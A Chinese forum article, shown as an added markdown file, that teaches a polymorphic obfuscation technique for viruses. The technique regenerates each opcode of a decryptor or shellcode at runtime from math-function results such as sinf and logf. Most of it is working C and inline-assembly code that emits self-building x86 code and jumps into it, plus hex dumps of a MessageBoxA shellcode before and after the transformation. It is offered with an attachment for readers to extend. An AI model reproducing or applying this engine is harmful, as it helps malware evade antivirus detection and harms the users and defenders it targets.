@@ -1,0 +1,507 @@
+
+# 隐藏 polymorphic 代码到数学函数中
+
+> 原文：[`www.pediy.com/kssd/pediy11/121482.html`](https://www.pediy.com/kssd/pediy11/121482.html)
+
+本准备今天 10.1 出去玩，结果闷家了![](img/9b2aec7f3d4bb041b2d419a59832192f.jpg "恐怖!")。
+
+还是发个帖子交流吧，顺便给[www.vxjump.net](http://www.vxjump.net)加点人气，一些搞安全技术的人搞的，大家多交流![](img/cda69129882b40377a87144c782680e1.jpg "微笑")
+
+不扯了看内容吧。
+
+## 0x01. 简介
+
+目前，病毒技术的多态技术手段仍然是以代码本身的变形为主，靠指令的运行中排列顺序的混淆，填充无效指令，等效指令等手段来完成对解密器的混淆。
+
+下面介绍一个新的混淆手段，把 polymorphic 代码隐藏在数学运算函数的结果中，还记得 spth 的那篇《Hiding your virus in the matrix》吗，类似地我们都把代码“藏”起来了。这里介绍一个最基本的利用 `sinf`（正弦波）的实例，完美有效的隐藏运行还需要发挥更多的想象力。
+
+## 0x02. polymorphic 设计
+
+首先考虑的是传统的多态技术，需要的是对解密器的指令分解，然后重新组成功能相同但代码形态不同的”新代码“。现在我们要换个思路，直接对 `opcode` 进行变形，如果对数学函数可以构造任意多个输入，都可以产生一个可对应的 `opcode` 字节，那么这些数字就是 polymorphic 的基础前提（每一次都可以变化这一硬性要求），这样我们要运行的代码就转而变成了运行多个数学函数的等价情况了。
+
+考虑一段常见入口代码：
+
+```
+00402B20  e>  $  55            push  ebp
+00402B21    .  8BEC           mov  ebp,esp
+00402B23    .  6A FF         push  -1
+00402B25       68            db 68    ;  CHAR 'h'
+...
+```
+
+如果它是由以下方式得来的:
+
+`function` 表示某一个数学函数
+
+`rand()` 表示任意一个随机数字
+
+```
+math.function(rand()) ------> opcode (0x55)
+math.function(rand()) ------> opcode (0x8b)
+math.function(rand()) ------> opcode (0xec)
+math.function(rand()) ------> opcode (0x6a)
+math.function(rand()) ------> opcode (0xff)
+math.function(rand()) ------> opcode (0x68)
+```
+
+下面看一个有规律性的运行结果：
+
+按照 `opcode` 从 0x00 ~ 0xff 开始当作输入，调用 `sinf` 函数的计算结果
+
+```
+emu opcode[00]:0.000000
+emu opcode[01]:0.841471
+emu opcode[02]:0.909297
+emu opcode[03]:0.141120
+emu opcode[04]:-0.756802
+emu opcode[05]:-0.958924
+emu opcode[06]:-0.279415
+emu opcode[07]:0.656987
+emu opcode[08]:0.989358
+emu opcode[09]:0.412118
+...
+emu opcode[f0]:0.945445
+emu opcode[f1]:0.784962
+emu opcode[f2]:-0.097212
+emu opcode[f3]:-0.890009
+emu opcode[f4]:-0.864536
+emu opcode[f5]:-0.044213
+emu opcode[f6]:0.816760
+emu opcode[f7]:0.926807
+emu opcode[f8]:0.184752
+emu opcode[f9]:-0.727163
+emu opcode[fa]:-0.970528
+emu opcode[fb]:-0.321594
+emu opcode[fc]:0.623012
+emu opcode[fd]:0.994824
+emu opcode[fe]:0.451999
+emu opcode[ff]:-0.506392
+```
+
+如果使输入的 `opcode` 值加上一个很小的浮点数值，所得到的结果上会有微小的变化，但开头的数字基本不会太大变化，但显然，我们还是很难总结出一个微小变化的 `opcode`（`opcode` + 浮点小数）和输出之间的关系。因为我们希望它的输出映射空间也是 0x00 ~ 0xff。
+
+所以要反过来思考，一个给定的 `opcod`，我们可以构造一个输入值空间，使得它的计算结果符合 `opcode`。
+
+也就是类似这样的形式： `0xff = f(asinf(-0.506392))`
+
+`f`：是一个算法使得“反 sinf"输入为-0.506392,得到 0xff
+
+整体的 polymorphic 思路就是:
+
+```
+math.function_1(rand())-------
+math.function_2(rand())       \
+math.function_3(rand())       |     随机使用其中一个              f(output)
+math.function_4(rand())      --------------------------> output ---------------->  opcode 中的一个字节
+math.function_5(rand())       |
+...                           |
+math.function_n(rand())-------/
+```
+
+基本的问我们已经解决了，就剩具体的动手工作了。
+
+### 2.1 - 随机数字的选择
+
+为了产生的效果更好些，我们需要随机化的一个浮点数（math 库里的函数基本都是 float，double 类型的输入），rand 随机数的空间是整数，要产生一个随机浮点数我们可以利用相除的情况，见下面代码：
+
+```c
+// ----------------------------------------------------------------------------------------------------------------------------------------------------
+#define  MAX_MULTIPLE  10000
+srand(time(0));
+for(int i = 0 ; i < 0xff ;i++)
+{
+  float r  = (double)rand();
+  float r2 = (double)rand();
+  if (r2)
+  {
+    r = r/r2 ;               //产生一个随机的浮点数
+    r = save_dot_float(r,5); //仅保留 5 位，按四舍五入保留
+    float x = i;
+    float y;
+    int   v;
+    x += r;
+    y = sinf(x);
+    y *= MAX_MULTIPLE;      //sinf 产生的是浮点数，我们把它扩大 10000 倍变成整数
+    v  = (int)y;
+    v &= 0x000000ff;        //取整数的末尾 1 个字节做 opcode
+    if (c/*要找到 opcode*/== v)
+    {
+      printf("find data:%0xf\n");
+    }
+  }
+}
+
+float save_dot_float(float f, int n)
+{
+  int i = (int)f;
+  int p = pow(10.0f, n);
+  float ft = (f - i) * p;
+  if((ft-(int)ft)>0.4)
+  {
+    ft += 1;
+  }
+  return ((int)ft)/(float)p;
+}
+// ----------------------------------------------------------------------------------------------------------------------------------------------------
+```
+
+这里就可以产生类似下面的整数值
+
+```
+emu opcode[0.324730]:c[76]
+emu opcode[1.417730]:26[9b]
+emu opcode[2.741400]:f[37]
+emu opcode[3.487240]:fffff2[c4]
+emu opcode[4.966580]:ffffda[32]
+emu opcode[5.630260]:ffffe8[45]
+emu opcode[6.651100]:e[0c]
+emu opcode[7.685790]:26[82]
+emu opcode[8.227840]:24[5d]
+emu opcode[9.100420]:c[73]
+emu opcode[10.453730]:ffffde[89]
+...
+```
+
+括起来的就是要查找的 `opcode` 值。
+
+## 0x03. 函数的选择
+
+由于输入的参数是浮点值，首先要考虑的是浮点值在内存中的存储格式问题。
+
+IEEE754 标准中规定，float 的 32 位是这样分类的：符号位(S) 1 位；阶码(E) 8 位 ；尾数(M) 23 位。
+
+32bit float 值的格式是 : `SEEEEEEEEMMMMMMMMMMMMMMMMMMMMMM`
+
+关于 float 的内存表示形式可详细参考这方面的文章例如《浮点数内存表示形式》.
+
+现在的问题是数学函数中的参数是要将一个浮点数转换成 hex 的格式的，而不是我们平时内存中所表达的十六进制格式，为了简化处理，我们选择那些输入参数都是 float 的函数。
+
+- `Math.acosf()` 计算反余弦值。
+- `Math.asinf()` 计算反正弦值。
+- `Math.atanf()` 计算反正切值。
+- `Math.atan2f()` 计算从 x 坐标轴到点的角度。
+- `Math.ceil()` 将数字向上舍入为最接近的整数。
+- `Math.cosf()` 计算余弦值。
+- `Math.exp()` 计算指数值。
+- `Math.floor()` 将数字向下舍入为最接近的整数。
+- `Math.log()` 计算自然对数。
+- `Math.pow()` 计算 x 的 y 次方。
+- `Math.round()` 四舍五入为最接近的整数。
+- `Math.sinf()` 计算正弦值。
+- `Math.sqrt()` 计算平方根。
+- `Math.tanf()` 计算正切值。
+- ...
+
+随机的组合这些函数即可。
+
+## 0x04. 生产多态代码
+
+首先看一个浮点数的计算过程，假设要计算的浮点数值为 172.527252，计算过程如下：
+
+```c
+float x  = (10000 * sinf(172.527252)) ;
+int   y  = (int)x;
+      y &= 0x000000ff;
+```
+
+以上获得输出 y 的最后一个字节。
+
+对应汇编代码如下
+
+```asm
+00402D5D 68 FA 86 2C 43      push        432C86FAh
+00402D62 E8 F8 E2 FF FF      call        _sinf(0040105f)
+00402D67 83 C4 04           add         esp,4
+00402D6A D8 0D A0 50 41 00   fmul        dword ptr [__real@4@400c9c40000000000000 (004150a0)]
+00402D70 D9 55 F8           fst         dword ptr [ebp-8]
+00402D73 E8 58 FD FF FF     call        _ftol (00402ad0)
+00402D78 89 45 F4           mov         dword ptr [ebp-0Ch],eax
+00402D7B 8B 45 F4           mov         eax,dword ptr [ebp-0Ch]
+00402D7E 25 FF 00 00 00     and         eax,0FFh
+00402D83 89 45 F4           mov         dword ptr [ebp-0Ch],eax
+```
+
+也就是我们产生的多态代码要和上面的类似，最后 eax 中的值也就是我们要的 `opcode` 值。我们将它写入一个新的内存空间中。
+
+也就是如下的整体过程，并将这些代码写入 `poly_math` 空间
+
+```asm
+pushad
+pushfd
+mov edi,jump_code ;//将要生成代码的空间地址赋值给 edi
+//产生一组计算函数调用的计算结果,将它写入 edi 中，
+call ...
+mov [edi],eax
+inc edi
+call ...
+mov [edi],eax
+inc edi
+call ...
+mov [edi],eax
+inc edi
+call ...
+mov [edi],eax
+inc edi
+call ...
+mov [edi],eax
+inc edi
+...
+jmp jump_code ;//运行被计算生产后的代码
+```
+
+### 4.1 - 重定位问题
+
+在产生的多态代码中要调用 `sinf` 函数，但每产生的一个代码都要计算一个相对跳转，所以可以写一个简单的处理函数。用来处理重定位
+
+```c
+unsigned int get_reloc_offset(unsigned int x1,unsigned int x2)
+{
+  //格式
+  //x1  ------- call x2
+  x2 -= x1;
+  x2 -= 5;
+  return x2;
+}
+```
+
+例如，如果要产生一个 call sinf 代码，`*t` 表示当前数组的索引。
+
+```c
+//call  logf
+off = get_reloc_offset((unsigned int)(&poly_math[0] + *t),(unsigned int)sinf);
+poly_math[(*t)++] = 0xe8;
+```
+
+
+
+```c
+poly_math[(*t)++] = *((char *)&off);
+poly_math[(*t)++] = *((char *)&off + 1);
+poly_math[(*t)++] = *((char *)&off + 2);
+poly_math[(*t)++] = *((char *)&off + 3);
+```
+
+### 4.2 - 获得 `\_ftol`
+
+`\_ftol` 是一个函数库中未导出的函数，没有简单的办法调用它，但它确是我们要生产 poly 代码必不可少的东西，所以需要是自己的实现。关于 `\_ftol` 这个函数云风曾写过一个优化版，这个版本的实现如下，
+
+```c
+int ftol(float f) {
+    int a          = *(int*)(&f);
+    int sign       = (a>>31);
+    int mantissa   = (a&((1<<23)-1))|(1<<23);
+    int exponent   = ((a&0x7fffffff)>>23)-127;
+    int r          = ((unsigned int)(mantissa)<<8)>>(31-exponent);
+    return ((r ^ (sign)) - sign ) &~ (exponent>>31);
+}
+```
+
+但为了方便 poly 代码生成，我还是使用系统自带的实现。
+
+```c
+__declspec(naked) my_ftol() {
+    __asm {
+        mov      ebp, esp
+        add      esp, 0FFFFFFF4h
+        wait
+        fnstcw   word ptr [ebp-2]
+        wait
+        mov      ax, word ptr [ebp-2]
+        or       ah, 0Ch
+        mov      word ptr [ebp-4], ax
+        fldcw    word ptr [ebp-4]
+        fistp    qword ptr [ebp-0Ch]
+        fldcw    word ptr [ebp-2]
+        mov      eax, dword ptr [ebp-0Ch]
+        mov      edx, dword ptr [ebp-8]
+        leave
+        sub      esp, 4  // 注意，这里是自己加入的，因为是我们改写了调用，故需要恢复一下堆栈平衡。
+        ret
+    }
+}
+```
+
+### 4.3 - 计算中的优化
+
+大家会注意到这样一条语句
+
+```
+fmul        dword ptr [__real@4@400c9c40000000000000 (004150a0)]
+```
+
+我们 `10000 * sinf(172.527252)` 中的 `10000` 被 `__real@4@400c9c40000000000000` 所替代，编译器会为这块的相乘的任意数值都分配一个空间来存放一个编译阶段就已经计算好的数值，用于和 `fmul` 做乘法运算，也就是
+
+```
+004150a0   __real@4@400c9c40000000000000   00 40 1c 46（这个计算好的浮点值就是 10000）
+```
+
+所以我们也要有个这样一个值来模拟这块的运算
+
+```c
+//fmul  dword ptr [__real@(10000)]
+float_to_hex(10000, &g_mul);
+d = (unsigned long)&g_mul;
+poly_math[(*t)++] = 0xd8;  // imul 10000
+poly_math[(*t)++] = 0x0d;
+poly_math[(*t)++] = *((char *)&d);
+poly_math[(*t)++] = *((char *)&d + 1);
+poly_math[(*t)++] = *((char *)&d + 2);
+poly_math[(*t)++] = *((char *)&d + 3);
+
+void float_to_hex(float f, unsigned long *push_data) {
+    unsigned char ba[4] = {0};
+    memcpy(&ba[0], &f, 4);
+    for (int i = 3; i >= 0; i--) {
+        *((char *)push_data + i) = ba[i];
+    }
+}
+```
+
+### 4.4 - 生成一个计算过程
+
+```c
+// x  -- 产生指定的 opcode 时，对应的随机浮点数
+// *t -- poly_math 数组对应的当前索引值
+void wirte_code(float x, int *t) {
+    int off;
+    unsigned long d;
+    float_to_hex(x, &d);
+    // push   y (转换浮点到 hex 后的值)
+    poly_math[(*t)++] = 0x68 ;
+    poly_math[(*t)++] = *((char *)&d);
+    poly_math[(*t)++] = *((char *)&d + 1);
+    poly_math[(*t)++] = *((char *)&d + 2);
+    poly_math[(*t)++] = *((char *)&d + 3);
+
+    //call  sinf
+    off = get_reloc_offset((unsigned int)(&poly_math[0] + *t), (unsigned int)sinf);
+    poly_math[(*t)++] = 0xe8;
+    poly_math[(*t)++] = *((char *)&off);
+    poly_math[(*t)++] = *((char *)&off + 1);
+    poly_math[(*t)++] = *((char *)&off + 2);
+    poly_math[(*t)++] = *((char *)&off + 3);
+
+    //add   esp,4
+    poly_math[(*t)++] = 0x83;
+    poly_math[(*t)++] = 0xc4;
+    poly_math[(*t)++] = 0x04;
+
+    //fmul  dword ptr [__real@(10000)] 中间运行结果也会被转换存储
+    float_to_hex(10000, &g_mul);
+    d = (unsigned long)&g_mul;
+    poly_math[(*t)++] = 0xd8;  // imul 10000
+    poly_math[(*t)++] = 0x0d;
+    poly_math[(*t)++] = *((char *)&d);
+    poly_math[(*t)++] = *((char *)&d + 1);
+    poly_math[(*t)++] = *((char *)&d + 2);
+    poly_math[(*t)++] = *((char *)&d + 3);
+
+    //fst        dword ptr [ebp-4]
+    poly_math[(*t)++] = 0xd9;
+    poly_math[(*t)++] = 0x55;
+    poly_math[(*t)++] = 0xfc;
+
+    //call  my_ftol
+    off = get_reloc_offset((unsigned int)(&poly_math[0] + *t), (unsigned int)my_ftol);
+    poly_math[(*t)++] = 0xe8;
+    poly_math[(*t)++] = *((char *)&off);
+    poly_math[(*t)++] = *((char *)&off + 1);
+    poly_math[(*t)++] = *((char *)&off + 2);
+    poly_math[(*t)++] = *((char *)&off + 3);
+
+    // eax,0FFh
+    poly_math[(*t)++] = 0x25;
+    poly_math[(*t)++] = 0xff;
+    poly_math[(*t)++] = 0x00;
+    poly_math[(*t)++] = 0x00;
+    poly_math[(*t)++] = 0x00;
+
+    // mov dword ptr ds:[edi],eax
+    poly_math[(*t)++] = 0x89;
+    poly_math[(*t)++] = 0x07;
+
+    //inc edi
+    poly_math[(*t)++] = 0x47;
+}
+```
+
+这里测试的例子选用了 `xpsp3` 下的 `87` 字节 `MessageBoxA` 的 `shellcode`。
+
+```
+// 原 shellcode 代码
+00416548 >31 C0 31 DB 31 C9 31 D2 51 68 6C 6C 20 20 68 33  1???hll  h3
+00416558  32 2E 64 68 75 73 65 72 89 E1 BB 7B 1D 80 7C 51  2.dhuser|Q
+00416568  FF D3 B9 5E 67 30 EF 81 C1 11 11 11 11 51 68 61  庸^g0?Qha
+00416578  67 65 42 68 4D 65 73 73 89 E1 51 50 BB 40 AE 80  geBhMessQP
+00416588  7C FF D3 89 E1 31 D2 52 51 51 52 FF D0 31 C0 50  |?QQR?
+00416598  B8 12 CB 81 7C FF D0 00 00 00 00 00 00 00 00 00  ?|?........
+004165A8  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+004165B8 >10 59 2F B6 28 65 D1 11 96 11 00 00 F8 1E        Y/?e??..?..
+```
+
+下面是对 `shellcode` 代码，进行两个多态后的数据对比。
+
+```
+// -- 单一使用 sinf 情况
+00416758 >60 9C BF F4 66 41 00 68 D8 61 80 42 E8 00 A9 FE  `A.hB?
+00416768  FF 83 C4 04 D8 0D F0 66 41 00 D9 55 FC E8 9F A8  ?A.
+00416778  FE FF 25 FF 00 00 00 89 07 47 68 B5 ED 02 43 E8  ?%...?Gh 淀 C
+00416788  DD A8 FE FF 83 C4 04 D8 0D F0 66 41 00 D9 55 FC  莰??A.
+00416798  E8 7C A8 FE FF 25 FF 00 00 00 89 07 47 68 D8 61  %...?Gh
+004167A8  80 42 E8 BA A8 FE FF 83 C4 04 D8 0D F0 66 41 00  B 韬?A.
+004167B8  D9 55 FC E8 59 A8 FE FF 25 FF 00 00 00 89 07 47  Y%...?G
+004167C8  68 18 09 06 42 E8 97 A8 FE FF 83 C4 04 D8 0D F0  h.B?
+004167D8  66 41 00 D9 55 FC E8 36 A8 FE FF 25 FF 00 00 00  fA.6%...
+004167E8  89 07 47 68 0B F2 49 43 E8 74 A8 FE FF 83 C4 04  ?Gh
+004167F8  D8 0D F0 66 41 00 D9 55 FC E8 13 A8 FE FF 25 FF  ?A.%
+00416808  00 00 00 89 07 47 68 82 E2 90 42 E8 51 A8 FE FF  ...?Gh
+00416818  83 C4 04 D8 0D F0 66 41 00 D9 55 FC E8 F0 A7 FE  ?A.皈
+00416828  FF 25 FF 00 00 00 89 07 47 68 0B F2 49 43 E8 2E  %...?G
+00416838  A8 FE FF 83 C4 04 D8 0D F0 66 41 00 D9 55 FC E8  ?A.
+00416848  CD A7 FE FF 25 FF 00 00 00 89 07 47 68 E5 73 DD  艇?%...?Gh
+00416858  41 E8 0B A8 FE FF 83 C4 04 D8 0D F0 66 41 00 D9  A??A.
+00416868  55 FC E8 AA A7 FE FF 25 FF 00 00 00 89 07 47 68  U?%...?Gh
+00416878  55 87 AA 42 E8 E8 A7 FE FF 83 C4 04 D8 0D F0 66  UB 梃?
+00416888  41 00 D9 55 FC E8 87 A7 FE FF 25 FF 00 00 00 89  A.?%...
+00416898  07 47 68 81 AB 5F 43 E8 C5 A7 FE FF 83 C4 04 D8  Gh_C 枧
+...
+
+// -- 单一使用 logf 情况
+00416758 >60 9C BF F4 66 41 00 68 38 2A 49 43 E8 F6 A8 FE  `A.h8*IC 桷
+00416768  FF 83 C4 04 D8 0D F0 66 41 00 D9 55 FC E8 9F A8  ?A.
+00416778  FE FF 25 FF 00 00 00 89 07 47 68 73 EB 38 42 E8  ?%...?Ghs?B
+00416788  D3 A8 FE FF 83 C4 04 D8 0D F0 66 41 00 D9 55 FC  莹??A.
+00416798  E8 7C A8 FE FF 25 FF 00 00 00 89 07 47 68 38 2A  %...?Gh8*
+004167A8  49 43 E8 B0 A8 FE FF 83 C4 04 D8 0D F0 66 41 00  IC 璋?A.
+004167B8  D9 55 FC E8 59 A8 FE FF 25 FF 00 00 00 89 07 47  Y%...?G
+```
+
+
+
+```
+004167C8   68 E3 C5 74 43 E8 8D A8 FE FF 83 C4 04 D8 0D F0   h 闩 tC?  
+004167D8   66 41 00 D9 55 FC E8 36 A8 FE FF 25 FF 00 00 00   fA.6%...  
+004167E8   89 07 47 68 38 2A 49 43 E8 6A A8 FE FF 83 C4 04   ?Gh8\*IC  
+004167F8   D8 0D F0 66 41 00 D9 55 FC E8 13 A8 FE FF 25 FF   ?A.%  
+00416808   00 00 00 89 07 47 68 E8 AA 0B 42 E8 47 A8 FE FF   ...?Gh 瑾  
+00416818   83 C4 04 D8 0D F0 66 41 00 D9 55 FC E8 F0 A7 FE   ?A.皈  
+00416828   FF 25 FF 00 00 00 89 07 47 68 38 2A 49 43 E8 24   %...?Gh8\*IC?  
+00416838   A8 FE FF 83 C4 04 D8 0D F0 66 41 00 D9 55 FC E8   ?A.  
+00416848   CD A7 FE FF 25 FF 00 00 00 89 07 47 68 6A C1 43   艇?%...?Ghj  
+00416858   41 E8 01 A8 FE FF 83 C4 04 D8 0D F0 66 41 00 D9   A??A.  
+00416868   55 FC E8 AA A7 FE FF 25 FF 00 00 00 89 07 47 68   U?%...?Gh  
+00416878   AB 08 A9 42 E8 DE A7 FE FF 83 C4 04 D8 0D F0 66   ?柁?  
+00416888   41 00 D9 55 FC E8 87 A7 FE FF 25 FF 00 00 00 89   A.?%...  
+00416898   07 47 68 3A 52 3B 43 E8 BB A7 FE FF 83 C4 04 D8   Gh:R;C 杌  
+```
+
+如果每次选择不同的数字函数进行变化，就可以产生完全不相同 `polymorphic` 代码了。
+
+### 0x06.其他
+
+扩展一下思路大家就会发现这样的变形方式适合很多领域和不同情况的组合，只要任意发挥就会有意想不到的结果。
+
+上传的附件
+
+| ![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg) | poly_to_math.rar |
+|---|---|
